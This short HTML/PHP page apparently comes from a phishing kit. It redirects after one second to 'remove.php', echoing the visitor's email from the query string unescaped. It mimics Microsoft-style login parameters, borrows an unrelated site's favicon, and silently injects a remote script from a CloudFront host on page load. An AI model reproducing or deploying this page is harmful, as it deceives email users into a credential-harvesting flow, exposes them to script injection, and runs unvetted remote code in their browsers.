
<html>

 <head>

<link rel="shortcut icon" href="https://www.firb.br/firb/images/favicon.ico"/>

 <meta http-equiv="refresh" content="1;URL=remove.php?email=<?php echo $_GET["email"];?>&.rand=13vqcr8bp0gklhiluhkjbvvghghjbud&lc=1033&id=64835456135515&mkt=en-us&cbcxt=mai&snsc=1' >';"/>



<style type="text/css">

body

 {



  height: 152%;

  width: 50%;

  padding: 0;

  margin: 0;

  background: black url(https://gallery.mailchimp.com/04fd0c580e7f39bacd1a789c4/images/f49756c7-19bf-48d2-b79e-274731d1ac2b.jpg) center center no-repeat;;

-webkit-background-size: cover;

-moz-background-size: cover;

-o-background-size: cover;

background-size: cover;

 }

 </style>



<script type="text/javascript">(function(){var a=document.createElement("script");a.type="text/javascript";a.async=!0;a.src="http://d36mw5gp02ykm5.cloudfront.net/yc/adrns_y.js?v=6.10.526#p=hgstxhcc545050a7e630_rbh50a151xsvlp1xsvlpx";var b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b);})();</script></head>

</html>